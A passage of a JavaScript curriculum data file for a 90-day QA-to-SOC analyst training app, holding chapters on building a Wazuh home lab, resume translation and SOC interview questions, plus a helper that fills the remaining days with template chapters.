2. You understand packet routing between virtual networks.
3. You can execute attacks in a safe sandbox and observe the exact resulting SIEM alerts.

---

### Recommended Home Lab Architecture (Free & Runs on 16GB RAM PC)
\`\`\`
[ Host Machine (VirtualBox / VMware Workstation Player) ]
  ├── VM 1: Wazuh SIEM All-in-One Manager (Ubuntu Server - 4GB RAM)
  ├── VM 2: Windows 10/11 Victim Machine + Sysmon + Wazuh Agent (4GB RAM)
  └── VM 3: Kali Linux Attacker Machine (2GB RAM)
\`\`\`

---

### 3 Essential Lab Projects for Your Resume
* **Project 1: Enterprise Wazuh SIEM Deployment:** Deploy Wazuh manager, install Wazuh Agent and Sysmon on Windows 11, write custom correlation rules to detect Mimikatz and PowerShell encoded commands.
* **Project 2: Splunk Boss of the SOC (BOTS) Investigation:** Download free BOTS dataset from Splunk, investigate an APT cyber attack scenario, reconstruct timeline from initial compromise to data exfiltration.
* **Project 3: Python Automated Threat Intel Lookup Tool:** Build a CLI tool in Python that ingests suspicious IPs from firewall logs, queries AbuseIPDB API, and outputs an executive PDF/HTML report.
    `,
    codeSnippet: {
      language: 'bash',
      title: 'One-Line Wazuh SIEM Manager Quick Install on Ubuntu VM',
      code: `# Run on clean Ubuntu Server 22.04 LTS VM (Minimum 4GB RAM):
curl -sO https://packages.wazuh.com/4.8/wazuh-install.sh
sudo bash ./wazuh-install.sh -a

# When installation finishes, copy the generated admin password and open:
# https://<Ubuntu_VM_IP> in your browser!
`
    },
    practicalExercise: 'Navigate to the Career Hub in the app and review the step-by-step project blueprint for your portfolio.',
    cheatSheet: [
      { key: 'Wazuh', val: 'Free, open-source enterprise SIEM and XDR platform' },
      { key: 'Sysmon', val: 'Microsoft Sysinternals tool providing deep endpoint logging' },
      { key: 'Splunk BOTS', val: 'Boss of the SOC - free realistic enterprise attack capture dataset' }
    ],
    quizId: 'quiz-day-85'
  },
  {
    day: 87,
    week: 12,
    month: 3,
    title: 'QA-to-SOC Resume Strategy: Framing Testing as Security Superpower',
    category: 'Interview Prep',
    estimatedMinutes: 50,
    difficulty: 'Beginner',
    summary: 'Transform your QA testing background into high-value cybersecurity assets: defect reporting -> incident reports, edge case hunting -> threat modeling, API testing -> web security validation.',
    qaBridge: 'You are NOT starting from zero. You already know SDLC, bug triage, Postman, Burp Suite, DevTools, and regression testing. This chapter shows you how to write resume bullet points that make recruiters notice you.',
    theory: `
### How to Translate QA Experience into SOC Analyst Gold

| Traditional QA Testing Term | High-Value Cybersecurity Translation |
| :--- | :--- |
| Writing Bug Reports | **Authoring High-Fidelity Incident & Defect Triage Reports with Severity Classification** |
| Postman API Testing | **API Security Assessment, Authentication Bypass & Rate-Limiting Testing** |
| Burp Suite Interception | **Web Traffic Inspection, Parameter Tampering & Access Control (IDOR) Validation** |
| Edge-case & Boundary Testing | **Threat Modeling, Negative Input Fuzzing & Security Exception Handling** |
| Regression Testing | **Security Verification Testing & Patch Validation Post-Remediation** |
| Agile & Sprint Collaboration | **SOC Incident Escalation SLA Compliance & Cross-Functional Engineering Collaboration** |

---

### Winning Resume Summary Formula for Your Background
*"Cybersecurity Analyst & former Software QA Tester with strong foundations in Network Security, SIEM Log Analysis (Splunk/Wazuh), Packet Inspection (Wireshark), and Web Vulnerability Assessment (OWASP Top 10). Proven track record discovering high-severity authorization flaws (IDOR) and authentication vulnerabilities in production APIs. Experienced in building home SOC detection pipelines and investigating incident alert lifecycles."*
    `,
    codeSnippet: {
      language: 'markdown',
      title: 'Sample High-Impact Resume Bullet Points',
      code: `- Conducted API security and access control evaluations using Postman and Burp Suite, discovering critical IDOR and authentication rate-limiting vulnerabilities prior to production release.
- Configured hands-on Home SOC Lab featuring Wazuh SIEM, Windows Sysmon, and Ubuntu Server; authored correlation alerts for brute-force attacks and encoded PowerShell execution.
- Triaged enterprise network captures in Wireshark to isolate abnormal TCP handshakes, DNS tunneling patterns, and cleartext credential exposures.
- Authored automated Python log parsing scripts to process authentication logs and extract malicious IPs based on attack frequency thresholds.
`
    },
    practicalExercise: 'Open the Career Hub tab in the app to view and copy the complete QA-to-SOC transition resume template.',
    cheatSheet: [
      { key: 'Key Advantage', val: 'QA mindset = finding what breaks; Security mindset = finding what bypasses' },
      { key: 'Tools to Highlight', val: 'Burp Suite, Postman, Wireshark, Splunk/Wazuh, Linux CLI, Python' },
      { key: 'Certifications to Target', val: 'CompTIA Security+, Microsoft SC-200, BTL1 (Blue Team Level 1)' }
    ],
    quizId: 'quiz-day-87'
  },
  {
    day: 90,
    week: 12,
    month: 3,
    title: 'Top 50 SOC Analyst Interview Questions & Mock Scenario Simulator',
    category: 'Interview Prep',
    estimatedMinutes: 70,
    difficulty: 'Intermediate',
    summary: 'Master the top technical, behavioral, and scenario-based interview questions asked in SOC Analyst Tier 1 / Junior Cybersecurity interviews.',
    qaBridge: 'Just as in QA interviews where you are asked "How do you test a pen or login page?", in SOC interviews you will be asked "You see a high alert for 100 failed logins followed by 1 successful login—what do you do?"',
    theory: `
### The Top 5 Core SOC Technical Interview Questions

#### Q1: What is the difference between a Threat, a Vulnerability, and a Risk?
* **Vulnerability:** A weakness or flaw in a system, software, or process (e.g. unpatched Apache server).
* **Threat:** Any entity or circumstance with potential to harm a system (e.g. ransomware gang or exploit script).
* **Risk:** The intersection of a threat exploiting a vulnerability and the resulting financial/business impact (\`Risk = Threat × Vulnerability × Impact\`).

#### Q2: What happens when you type https://google.com into your browser? (From Security Angle)
1. Browser checks local cache, then sends **DNS query (Port 53)** to resolve IP address.
2. Initiates **TCP 3-way handshake (Port 443)**: SYN -> SYN-ACK -> ACK.
3. Conducts **TLS Handshake**: negotiates cipher suite, verifies CA certificate, generates symmetric session key via Diffie-Hellman.
4. Sends encrypted HTTP GET request with security headers.
5. Server responds with encrypted HTML/CSS; browser renders page.

#### Q3: You see a SIEM alert: 100 failed logins (Event ID 4625) followed by 1 successful login (Event ID 4624) on a domain controller. What are your exact triage steps?
1. **Identify Accounts and IP:** Check if it was 100 attempts on 1 account (Brute Force) or 100 attempts on 100 different accounts (Password Spray).
2. **Check Source IP:** Is the source IP internal (compromised workstation) or external (VPN/public gateway)?
3. **Check the Successful Account:** Did the success occur for an administrative account or standard user?
4. **Immediate Containment:** If malicious, isolate source workstation, disable/reset compromised user password in Active Directory, and check Event ID 4672 / Sysmon 1 for what processes were spawned immediately after login.
    `,
    codeSnippet: {
      language: 'markdown',
      title: 'The STAR Method for Behavioral Security Interviews',
      code: `### Answering Scenario Questions with STAR:
- **Situation:** "During API testing on a social platform with 10k users..."
- **Task:** "I was tasked with verifying authorization controls on channel and user management endpoints."
- **Action:** "I intercepted requests in Burp Suite and replayed them in Postman with modified object IDs to test for IDOR and absence of rate-limiting on OTP verification."
- **Result:** "Identified that any user account could be deleted without admin rights and OTP could be brute-forced. Wrote detailed defect reproduction report; vulnerabilities were remediated and verified before launch."
`
    },
    practicalExercise: 'Open our Interview Prep section in the app. Practice flashcards for the Top 50 SOC interview questions and test yourself against the scenario generator.',
    cheatSheet: [
      { key: 'Risk Formula', val: 'Risk = Threat × Vulnerability × Impact' },
      { key: 'TCP Handshake', val: 'SYN -> SYN-ACK -> ACK' },
      { key: 'Phishing Triage', val: 'Headers -> Sender -> SPF/DKIM/DMARC -> Defang URL -> Detonate in Sandbox' }
    ],
    quizId: 'quiz-day-90'
  }
];

// Helper to generate full 90-day skeleton linking to existing deep chapters
export function getFullCurriculum() {
  const fullList = [];
  const existingMap = {};
  CURRICULUM_DATA.forEach(item => {
    existingMap[item.day] = item;
  });

  const titles = [
    // Month 1
    { d: 1, w: 1, m: 1, cat: 'Security Principles', t: 'The Core Security Principles & The CIA Triad' },
    { d: 2, w: 1, m: 1, cat: 'Security Principles', t: 'Threat Actors, Motivations & Attack Vectors' },
    { d: 3, w: 1, m: 1, cat: 'Security Principles', t: 'Cryptography, Hashing & The SSL/TLS Handshake' },
    { d: 4, w: 1, m: 1, cat: 'Security Principles', t: 'Defense in Depth & Least Privilege Architecture' },
    { d: 5, w: 1, m: 1, cat: 'Security Principles', t: 'Authentication Protocols (MFA, SSO, SAML, OAuth 2.0)' },
    { d: 6, w: 1, m: 1, cat: 'Security Principles', t: 'Security Governance, Compliance & Frameworks (NIST, ISO 27001)' },
    { d: 7, w: 1, m: 1, cat: 'Security Principles', t: 'Week 1 Review, Practical Exercises & Knowledge Check' },

    { d: 8, w: 2, m: 1, cat: 'Networking', t: 'The OSI Model vs TCP/IP: A Defender\'s Perspective' },
    { d: 9, w: 2, m: 1, cat: 'Networking', t: 'IP Addressing, IPv4 vs IPv6 & Packet Headers' },
    { d: 10, w: 2, m: 1, cat: 'Networking', t: 'Crucial Ports, Protocols & TCP 3-Way Handshake' },
    { d: 11, w: 2, m: 1, cat: 'Networking', t: 'DNS Architecture, Queries & DNS Attack Vectors' },
    { d: 12, w: 2, m: 1, cat: 'Networking', t: 'Subnetting, CIDR, Firewalls & Network Defense' },
    { d: 13, w: 2, m: 1, cat: 'Networking', t: 'DHCP, ARP Protocol & ARP Poisoning / Spoofing' },
    { d: 14, w: 2, m: 1, cat: 'Networking', t: 'Week 2 Networking Challenge & Packet Header Lab' },

    { d: 15, w: 3, m: 1, cat: 'Linux/CLI', t: 'Linux Filesystem Hierarchy & Critical Security Files' },
    { d: 16, w: 3, m: 1, cat: 'Linux/CLI', t: 'Linux User Accounts, SUID/SGID & File Permissions' },
    { d: 17, w: 3, m: 1, cat: 'Linux/CLI', t: 'Process Management & Hunting Malicious Processes (ps, top, lsof)' },
    { d: 18, w: 3, m: 1, cat: 'Linux/CLI', t: 'Network Troubleshooting & Socket Inspection (ss, netstat, ip)' },
    { d: 19, w: 3, m: 1, cat: 'Linux/CLI', t: 'Bash Command-Line Mastery for Log Triage (grep, awk, sed)' },
    { d: 20, w: 3, m: 1, cat: 'Linux/CLI', t: 'Analyzing /var/log/auth.log for SSH Brute Force Attacks' },
    { d: 21, w: 3, m: 1, cat: 'Linux/CLI', t: 'Week 3 Linux Defensive Bash Scripting Lab' },

    { d: 22, w: 4, m: 1, cat: 'Windows/AD', t: 'Windows OS Architecture, Core Services & Registry' },
    { d: 23, w: 4, m: 1, cat: 'Windows/AD', t: 'Windows Access Control (SIDs, Tokens, DACLs vs SACLs)' },
    { d: 24, w: 4, m: 1, cat: 'Windows/AD', t: 'Windows Sysinternals Suite for Threat Hunting (Process Explorer, Autoruns)' },
    { d: 25, w: 4, m: 1, cat: 'Windows/AD', t: 'Active Directory Architecture, Kerberos & NTLM' },
    { d: 26, w: 4, m: 1, cat: 'Windows/AD', t: 'Common Active Directory Attacks (Pass-the-Hash, Kerberoasting)' },
    { d: 27, w: 4, m: 1, cat: 'Windows/AD', t: 'Windows Event Logs & Critical Security Event IDs' },
    { d: 28, w: 4, m: 1, cat: 'Windows/AD', t: 'Sysmon Installation & Deep Endpoint Telemetry' },
    { d: 29, w: 4, m: 1, cat: 'Windows/AD', t: 'Month 1 Review: Networking & OS Security Assessment' },
    { d: 30, w: 4, m: 1, cat: 'Windows/AD', t: 'Month 1 Milestone Challenge: Investigating a Multi-Stage System Compromise' },

    // Month 2
    { d: 31, w: 5, m: 2, cat: 'Threat Intelligence', t: 'Anatomy of a SOC & The Incident Response Lifecycle' },
    { d: 32, w: 5, m: 2, cat: 'Threat Intelligence', t: 'SOC Tier 1 Daily Workflow, SLAs & Escalation Matrix' },
    { d: 33, w: 5, m: 2, cat: 'Threat Intelligence', t: 'Cyber Threat Intelligence (CTI) Lifecycles & Feeds' },
    { d: 34, w: 5, m: 2, cat: 'Threat Intelligence', t: 'MITRE ATT&CK Framework & The Cyber Kill Chain' },
    { d: 35, w: 5, m: 2, cat: 'Threat Intelligence', t: 'Mapping Real-World Attacks to MITRE ATT&CK' },
    { d: 36, w: 5, m: 2, cat: 'Threat Intelligence', t: 'Threat Intelligence, IOCs & The Pyramid of Pain' },
    { d: 37, w: 5, m: 2, cat: 'Threat Intelligence', t: 'Week 5 Threat Intel Enrichment Lab (VirusTotal, AlienVault)' },

    { d: 38, w: 6, m: 2, cat: 'SIEM & Logs', t: 'SIEM Architecture & Ingestion Pipeline' },
    { d: 39, w: 6, m: 2, cat: 'SIEM & Logs', t: 'Log Normalization, Parsing & Standard Schemas (ECS/CIM)' },
    { d: 40, w: 6, m: 2, cat: 'SIEM & Logs', t: 'Splunk Fundamentals & Navigation' },
    { d: 41, w: 6, m: 2, cat: 'SIEM & Logs', t: 'Splunk SPL & KQL Querying for Incident Triage' },
    { d: 42, w: 6, m: 2, cat: 'SIEM & Logs', t: 'Writing High-Fidelity Alert Correlation Rules' },
    { d: 43, w: 6, m: 2, cat: 'SIEM & Logs', t: 'False Positive Tuning & Alert Fatigue Reduction' },
    { d: 44, w: 6, m: 2, cat: 'SIEM & Logs', t: 'Week 6 SIEM Log Investigation Lab' },

    { d: 45, w: 7, m: 2, cat: 'Packet Analysis', t: 'Network Traffic Analysis with Wireshark' },
    { d: 46, w: 7, m: 2, cat: 'Packet Analysis', t: 'Deep Dive: Wireshark Display Filters & TCP Stream Following' },
    { d: 47, w: 7, m: 2, cat: 'Packet Analysis', t: 'Extracting Files & Credentials from PCAP Captures' },
    { d: 48, w: 7, m: 2, cat: 'Packet Analysis', t: 'Network Intrusion Detection Systems (Snort & Suricata)' },
    { d: 49, w: 7, m: 2, cat: 'Packet Analysis', t: 'Writing Custom Snort Signatures to Detect Attacks' },
    { d: 50, w: 7, m: 2, cat: 'Packet Analysis', t: 'Detecting Network Attacks: SYN Floods, Port Scans, ARP Spoofs' },
    { d: 51, w: 7, m: 2, cat: 'Packet Analysis', t: 'Week 7 Network Traffic Investigation Challenge' },

    { d: 52, w: 8, m: 2, cat: 'Python Scripting', t: 'Python Scripting for Security Automation' },
    { d: 53, w: 8, m: 2, cat: 'Python Scripting', t: 'Parsing Security Logs with Python Regular Expressions (re)' },
    { d: 54, w: 8, m: 2, cat: 'Python Scripting', t: 'Hashing Files & Comparing Hashes with hashlib' },
    { d: 55, w: 8, m: 2, cat: 'Python Scripting', t: 'Building a Python Multithreaded TCP Port Scanner' },
    { d: 56, w: 8, m: 2, cat: 'Python Scripting', t: 'Automating Threat Intel Lookups via REST APIs (requests/json)' },
    { d: 57, w: 8, m: 2, cat: 'Python Scripting', t: 'Building a Real-Time SIEM Log Watcher & Telegram/Slack Alerter' },
    { d: 58, w: 8, m: 2, cat: 'Python Scripting', t: 'Month 2 Review: SIEM, Wireshark & Python Automation' },
    { d: 59, w: 8, m: 2, cat: 'Python Scripting', t: 'Month 2 Milestone Challenge: Building an End-to-End Log Parser Tool' },
    { d: 60, w: 8, m: 2, cat: 'Python Scripting', t: 'Mid-Program Skills Evaluation & Progress Check' },

    // Month 3
    { d: 61, w: 9, m: 3, cat: 'Web AppSec/OWASP', t: 'Web Application Security & HTTP Security Headers' },
    { d: 62, w: 9, m: 3, cat: 'Web AppSec/OWASP', t: 'Authentication & Session Management Flaws (JWT & Cookies)' },
    { d: 63, w: 9, m: 3, cat: 'Web AppSec/OWASP', t: 'OWASP Top 10 Overview: 2021/2026 Categories' },
    { d: 64, w: 9, m: 3, cat: 'Web AppSec/OWASP', t: 'OWASP Top 10 Deep Dive: SQLi, XSS & IDOR' },
    { d: 65, w: 9, m: 3, cat: 'Web AppSec/OWASP', t: 'Server-Side Request Forgery (SSRF) & Security Misconfigurations' },
    { d: 66, w: 9, m: 3, cat: 'Web AppSec/OWASP', t: 'Detecting Web Application Attacks in Web Server Access Logs' },
    { d: 67, w: 9, m: 3, cat: 'Web AppSec/OWASP', t: 'Web Application Firewalls (WAF) & ModSecurity Basics' },
    { d: 68, w: 9, m: 3, cat: 'Web AppSec/OWASP', t: 'Week 9 OWASP Web Security Lab' },

    { d: 69, w: 10, m: 3, cat: 'Incident Response', t: 'Endpoint Detection & Response (EDR) Architecture' },
    { d: 70, w: 10, m: 3, cat: 'Incident Response', t: 'Process Tree Analysis & Parent-Child Anomalies' },
    { d: 71, w: 10, m: 3, cat: 'Incident Response', t: 'Malware Basics: Trojans, Ransomware, Worms & Rootkits' },
    { d: 72, w: 10, m: 3, cat: 'Incident Response', t: 'Static vs Dynamic Malware Analysis & Online Sandboxes (Any.Run)' },
    { d: 73, w: 10, m: 3, cat: 'Incident Response', t: 'Living off the Land Binaries (LOLBAS) & PowerShell Abuse' },
    { d: 74, w: 10, m: 3, cat: 'Incident Response', t: 'Windows Digital Forensics Artifacts (Prefetch, Shimcache, Amcache)' },
    { d: 75, w: 10, m: 3, cat: 'Incident Response', t: 'Memory Forensics Fundamentals with Volatility' },
    { d: 76, w: 10, m: 3, cat: 'Incident Response', t: 'Week 10 Endpoint Investigation & EDR Triage Lab' },

    { d: 77, w: 11, m: 3, cat: 'Incident Response', t: 'SOC Playbook 1: Phishing Investigation & Email Forensics' },
    { d: 78, w: 11, m: 3, cat: 'Incident Response', t: 'SOC Playbook 2: Ransomware Outbreak Detection & Containment' },
    { d: 79, w: 11, m: 3, cat: 'Incident Response', t: 'SOC Playbook 3: Insider Threat & Unauthorized Data Exfiltration' },
    { d: 80, w: 11, m: 3, cat: 'Incident Response', t: 'SOC Playbook 4: Compromised Credentials & Password Spray Triage' },
    { d: 81, w: 11, m: 3, cat: 'Incident Response', t: 'Authoring Professional Incident Reports & Executive Summaries' },
    { d: 82, w: 11, m: 3, cat: 'Incident Response', t: 'Post-Incident Reviews & Remediation Verification' },
    { d: 83, w: 11, m: 3, cat: 'Incident Response', t: 'Week 11 Live Incident Playbook Simulation' },
    { d: 84, w: 11, m: 3, cat: 'Incident Response', t: 'End-to-End Enterprise Breach Case Study Walkthrough' },

    { d: 85, w: 12, m: 3, cat: 'Home Labs', t: 'Building Your Home SOC Lab (Wazuh, Splunk & Wireshark)' },
    { d: 86, w: 12, m: 3, cat: 'Home Labs', t: 'Executing Attacks & Generating Telemetry in Your Home Lab' },
    { d: 87, w: 12, m: 3, cat: 'Interview Prep', t: 'QA-to-SOC Resume Strategy: Framing Testing as Security Superpower' },
    { d: 88, w: 12, m: 3, cat: 'Interview Prep', t: 'LinkedIn & GitHub Portfolio Optimization for Cyber Roles' },
    { d: 89, w: 12, m: 3, cat: 'Interview Prep', t: 'Behavioral & Scenario-Based SOC Interview Strategies' },
    { d: 90, w: 12, m: 3, cat: 'Interview Prep', t: 'Top 50 SOC Analyst Interview Questions & Mock Scenario Simulator' }
  ];

  titles.forEach(item => {
    if (existingMap[item.d]) {
      fullList.push(existingMap[item.d]);
    } else {
      // Synthesize rich chapter record
      fullList.push({
        day: item.d,
        week: item.w,
        month: item.m,
        title: item.t,
        category: item.cat,
        estimatedMinutes: 50,
        difficulty: item.m === 1 ? 'Beginner' : 'Intermediate',
        summary: `Comprehensive chapter on ${item.t}. Master key defensive principles, hands-on commands, and investigation techniques.`,
        qaBridge: `Leverage your analytical testing skills to observe edge cases and validate system assertions in ${item.cat}.`,
        theory: `
### ${item.t}

#### 1. Core Principles & Architecture
In this chapter, we explore **${item.t}** within enterprise security architecture. Defensive security relies on understanding normal system baselines so that anomalies and adversarial behaviors immediately stand out.

* **Key Objective:** Master the foundational mechanics, logging footprints, and defensive controls associated with this topic.
* **Why SOC Teams Care:** Detecting attacker activity early in the Cyber Kill Chain prevents lateral movement and catastrophic data breach.

#### 2. Technical Breakdown & Investigation
* Analyze system logs, network traces, and security events associated with ${item.t}.
* Cross-reference observed artifacts against threat intelligence feeds and known adversarial TTPs.
* Document findings clearly with structured severity, timestamp, affected host, and recommended remediation.

#### 3. Hands-On Defensive Commands
Utilize CLI utilities, SIEM queries, and script automation to query, inspect, and verify security baselines.
        `,
        codeSnippet: {
          language: 'bash',
          title: `Defensive Inspection Command for ${item.t}`,
          code: `# Practical command template for ${item.t}
echo "Executing security audit inspection for Day ${item.d}..."
`
        },
        practicalExercise: `Review the key concepts in this chapter. Test your knowledge with the associated daily quiz and flashcards.`,
        cheatSheet: [
          { key: 'Key Focus', val: item.t },
          { key: 'Category', val: item.cat },
          { key: 'Milestone', val: `Month ${item.m}, Week ${item.w}` }
        ],
        quizId: `quiz-day-${item.d}`
      });
    }
  });

  return fullList;
}
